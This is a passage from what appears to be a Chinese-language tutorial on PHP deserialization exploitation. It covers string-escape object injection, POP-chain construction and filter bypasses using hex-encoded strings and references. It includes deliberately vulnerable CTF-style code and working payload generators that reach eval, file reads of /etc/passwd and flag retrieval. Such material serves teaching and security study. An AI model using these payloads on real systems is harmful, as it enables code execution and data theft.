<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:8:&quot;password&quot;;s:6:&quot;</span><br><span class="line">//长度为22</span><br></pre></td></tr></table></figure>
<p>因为每次过滤的时候都会少<strong> 1</strong> 个字符，因此我们先将<strong> admin</strong> 字符重复<strong> 22</strong> 遍，这里 22 遍是大概值，后续还需要调整</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$a = new user(&#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&#x27;,&#x27;123456&#x27;);</span><br><span class="line">$a_seri = serialize($a);</span><br><span class="line">$a_seri_filter = filter($a_seri);</span><br><span class="line"></span><br><span class="line">echo $a_seri_filter;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:105:&quot;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</span><br></pre></td></tr></table></figure>
<p>** 注意：**PHP 反序列化的机制是，比如如果前面是规定了有 10 个字符，但是只读到了 9 个就到了双引号，这个时候 PHP 会把双引号当做第 10 个字符，也就是说不根据双引号判断一个字符串是否已经结束，而是根据前面规定的数量来读取字符串。</p>
<p>105 个字符结束后，位置如下</p>
<p><code>hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;;s:8:&quot;password&quot;;s:6:</code></p>
<p>也就是我们覆盖了 <code>;s:8:&quot;password&quot;;s:6:</code> ，接下来我们的 username 的值变会覆盖后续的字符串</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$a = new user(&#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&#x27;,&#x27;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&#x27;);</span><br><span class="line">$a_seri = serialize($a);</span><br><span class="line">$a_seri_filter = filter($a_seri);</span><br><span class="line"></span><br><span class="line">echo $a_seri_filter;</span><br><span class="line"></span><br><span class="line">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:105:&quot;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;;s:8:&quot;password&quot;;s:47:&quot;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</span><br></pre></td></tr></table></figure>
<p>仔细观察这一串字符串可以我们希望覆盖的 107 个字符，但是前面只有显示 105</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;;s:8:&quot;password&quot;;s:47:&quot;</span><br></pre></td></tr></table></figure>
<p><strong>解决办法是</strong>：多添加<strong> 2</strong> 个<strong> admin</strong>，这样就可以补上缺少的字符。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$a = new user(&#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&#x27;,&#x27;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&#x27;);</span><br><span class="line">$a_seri = serialize($a);</span><br><span class="line">$a_seri_filter = filter($a_seri);</span><br><span class="line"></span><br><span class="line">echo $a_seri_filter;</span><br><span class="line">?&gt;</span><br><span class="line">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:115:&quot;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;;s:8:&quot;password&quot;;s:47:&quot;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</span><br></pre></td></tr></table></figure>
<p>115 个字符的覆盖范围 <code>hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;;s:8:&quot;password&quot;;s:47:&quot;</code></p>
<p>可以看到，这一下就对了。</p>
<p>我们将对象反序列化然后输出，代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class user&#123;</span><br><span class="line">	public $username;</span><br><span class="line">	public $password;</span><br><span class="line">	public $isVIP;</span><br><span class="line">	</span><br><span class="line">	public function __construct($u,$p)&#123;</span><br><span class="line">		$this-&gt;username = $u;</span><br><span class="line">		$this-&gt;password = $p;</span><br><span class="line">		$this-&gt;isVIP = 0;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function filter($s)&#123;</span><br><span class="line">	return str_replace(&quot;admin&quot;,&quot;hack&quot;,$s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new user(&#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&#x27;,&#x27;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&#x27;);</span><br><span class="line">$a_seri = serialize($a);</span><br><span class="line">$a_seri_filter = filter($a_seri);</span><br><span class="line">$a_seri_filter_unseri = unserialize($a_seri_filter);</span><br><span class="line"></span><br><span class="line">var_dump($a_seri_filter_unseri);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>得到结果：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">object(user)#2 (3) &#123;</span><br><span class="line">  [&quot;username&quot;]=&gt;</span><br><span class="line">  string(115) &quot;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;;s:8:&quot;password&quot;;s:47:&quot;&quot;</span><br><span class="line">  [&quot;password&quot;]=&gt;</span><br><span class="line">  string(6) &quot;123456&quot;</span><br><span class="line">  [&quot;isVIP&quot;]=&gt;</span><br><span class="line">  int(1)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>总结一下变短的步骤：</p>
<blockquote>
<p>1. 分析他过滤了那个参数，那个参数是我们可控的</p>
<p>​	上述例子中 username，password 是可控的，但只对 username 进行了过滤，因此我们的对象逃逸就会出现在 username 中</p>
<p>2. 构造我们的 payload，即我们想要覆盖哪个变量</p>
<p>​	上述例子中，我们想要将 isVIP 变为 1，因此我们构造的 payload 为：  <code>&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;</code> ，并且需要计算长度，为了我们之后的覆盖做准备</p>
<p>3. 分析它的过滤函数，计算到下一个可控变量的长度，将它和（2）中的长度分析</p>
<p>​	上述例子中，我们的目标长度 <code>&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;</code>  为 47，到下一个可控变量长度 <code>&quot;;s:8:&quot;password&quot;;s:6:&quot;</code>  为 22</p>
<p>​	那么为什么要分析到下一个可控变量的长度呢，因为这中间的 22 个字符就是我们想要吃掉的字符，也就是 username 把原来的 password 吃掉了，现在的 password 我们自己可以写了，我们在自己写的 password 中就可以覆盖掉 isVIP</p>
<p>4. 进行覆盖与调整</p>
<p>​	上述例子中，我们第一次写了 22 个 admin，但后续序列化后发现长度不够，增加至 24 个 admin。调整是为了让每个变量的 &quot; 的位置和前面的字符串数量的位置相同</p>
<p>5. 进行反序列化验证</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//变长</span><br><span class="line">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:282:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</span><br><span class="line"></span><br><span class="line">//变少</span><br><span class="line">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:115:&quot;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;;s:8:&quot;password&quot;;s:47:&quot;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</span><br><span class="line"></span><br><span class="line">变长是通过将s:后的长度变长，导致可以将不是自己的序列化的东西也收进来</span><br><span class="line">变少是通过将自己本来序列化后不是一个对象的值缩到一个对象中，那么其他缩的对象值就空了，我们就可以覆盖了</span><br><span class="line"></span><br><span class="line">https://www.secpulse.com/archives/165222.html</span><br></pre></td></tr></table></figure>
<p>比如：</p>
<h4 id="0x05pop-链利用"><a class="markdownIt-Anchor" href="#0x05pop-链利用">#</a> 0x05POP 链利用</h4>
<p>上面的两个例子都是基于 &quot;自动调用&quot; 的 magic function。** 但当漏洞 / 危险代码存在类的普通方法中，就不能指望通过 &quot;自动调用&quot; 来达到目的了。** 这时我们需要去寻找相同的函数名，把敏感函数和类联系在一起。一般来说在代码审计的时候我们都要盯紧这些敏感函数的，层层递进，最终去构造出一个有杀伤力的 payload。</p>
<p><strong>1. 一些有用的 POP 链中出现的方法：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- 命令执行：exec()、passthru()、popen()、system()</span><br><span class="line">- 文件操作：file_put_contents()、file_get_contents()、unlink()</span><br><span class="line">- 代码执行：eval()、assert()、call_user_func()   //call_user_func(assert,phpinfo());</span><br></pre></td></tr></table></figure>
<p><strong>2. 反序列化中为了避免信息丢失，使用大写 S 支持字符串的编码。</strong></p>
<p>PHP 为了更加方便进行反序列化 Payload 的 传输与显示 (避免丢失某些控制字符等信息)，我们可以在序列化内容中用大写 S 表示字符串，此时这个字符串就支持将后面的字符串用 16 进制表示，使用如下形式即可绕过，即：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s:4:&quot;user&quot;; -&gt; S:4:&quot;use\72&quot;;</span><br></pre></td></tr></table></figure>
<p><strong>3. 深浅 copy</strong></p>
<p>在 php 中如果我们使用 &amp; 对变量 A 的值指向变量 B，这个时候是属于浅拷贝，当变量 B 改变时，变量 A 也会跟着改变。在被反序列化的对象的某些变量被过滤了，但是其他变量可控的情况下，就可以利用浅拷贝来绕过过滤。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$A = &amp;$B; </span><br></pre></td></tr></table></figure>
<p><strong>4. 利用 PHP 伪协议</strong></p>
<p>配合 PHP 伪协议实现文件包含、命令执行等漏洞。如 glob:// 伪协议查找匹配的文件路径模式。</p>
<h4 id="0x06"><a class="markdownIt-Anchor" href="#0x06">#</a> 0x06</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class main &#123;</span><br><span class="line">    protected $ClassObj;</span><br><span class="line"></span><br><span class="line">    function __construct() &#123;</span><br><span class="line">        $this-&gt;ClassObj = new normal();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        $this-&gt;ClassObj-&gt;action();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class normal &#123;</span><br><span class="line">    function action() &#123;</span><br><span class="line">        echo &quot;hello bmjoker&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class evil &#123;</span><br><span class="line">    private $data;</span><br><span class="line">    function action() &#123;</span><br><span class="line">        eval($this-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">//$a = new main();</span><br><span class="line">unserialize($_GET[&#x27;a&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">main</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$ClassObj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = <span class="string">&quot;phpinfo()&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">main</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">或者这样构造也行</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">main</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$ClassObj</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ClassObj = <span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = <span class="string">&quot;phpinfo();&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">main</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>
<blockquote>
<p>但是由于<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mi>l</mi><mi>a</mi><mi>s</mi><mi>s</mi><mi>O</mi><mi>b</mi><mi>j</mi><mtext>是</mtext><mi>p</mi><mi>r</mi><mi>o</mi><mi>t</mi><mi>e</mi><mi>c</mi><mi>t</mi><mi>e</mi><mi>d</mi><mtext>类型修饰，</mtext></mrow><annotation encoding="application/x-tex">ClassObj是protected类型修饰，</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">a</span><span class="mord mathnormal">s</span><span class="mord mathnormal">s</span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal">b</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mord cjk_fallback">是</span><span class="mord mathnormal">p</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">o</span><span class="mord mathnormal">t</span><span class="mord mathnormal">e</span><span class="mord mathnormal">c</span><span class="mord mathnormal">t</span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mord cjk_fallback">类</span><span class="mord cjk_fallback">型</span><span class="mord cjk_fallback">修</span><span class="mord cjk_fallback">饰</span><span class="mord cjk_fallback">，</span></span></span></span>data 是 private 类型修饰，在序列化的时候，多出来的字节都被 \x00 填充，需要进行在代码中使用 urlencode 对序列化后字符串进行编码，否则无法复制解析。</p>
<p>或者直接改不可见字符为 %00</p>
<p>url 地址栏中会自动帮我们解析一次 url 编码</p>
</blockquote>
<h4 id="0x07"><a class="markdownIt-Anchor" href="#0x07">#</a> 0x07</h4>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyFile</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$user</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user = <span class="variable">$user</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(<span class="variable">$this</span>-&gt;name, <span class="string">&quot;flag&quot;</span>)!==False) </span><br><span class="line">            <span class="variable language_">$this</span>-&gt;name = <span class="string">&quot;/etc/hostname&quot;</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;name = <span class="string">&quot;/etc/passwd&quot;</span>; </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;user = <span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>]; </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;input&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$input</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;input&#x27;</span>]; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(<span class="variable">$input</span>, <span class="string">&#x27;user&#x27;</span>)!==False)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Hacker&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$input</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">paload:</span><br><span class="line">&lt;?php</span><br><span class="line">class MyFile &#123;</span><br><span class="line">    public $name = &#x27;/etc/hosts&#x27;;</span><br><span class="line">    public $user = &#x27;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">$a = new MyFile();</span><br><span class="line">$a-&gt;name = &amp;$a-&gt;user;</span><br><span class="line">$b = serialize($a);</span><br><span class="line">$b = str_replace(&quot;user&quot;, &quot;use\\72&quot;, $b);</span><br><span class="line">$b = str_replace(&quot;s&quot;, &quot;S&quot;, $b);</span><br><span class="line">var_dump($b);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">//通过浅拷贝绕过 if(stristr($this-&gt;name, &quot;flag&quot;)!==False) </span><br><span class="line">//通过十六进制绕过if(stristr($input, &#x27;user&#x27;)!==False)</span><br></pre></td></tr></table></figure>
<h4 id="0x08"><a class="markdownIt-Anchor" href="#0x08">#</a> 0x08</h4>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">start_gg</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mod1-&gt;<span class="title function_ invoke__">test1</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Call</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mod1-&gt;<span class="title function_ invoke__">test2</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">funct</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$test2</span>,<span class="variable">$arr</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$s1</span> = <span class="variable language_">$this</span>-&gt;mod1;</span><br><span class="line">        <span class="variable">$s1</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mod2 = <span class="string">&quot;字符串拼接&quot;</span>.<span class="variable language_">$this</span>-&gt;mod1;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">string1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;str1-&gt;<span class="title function_ invoke__">get_flag</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;flag:xxxxxxxxxxxx&quot;</span>;</span><br><span 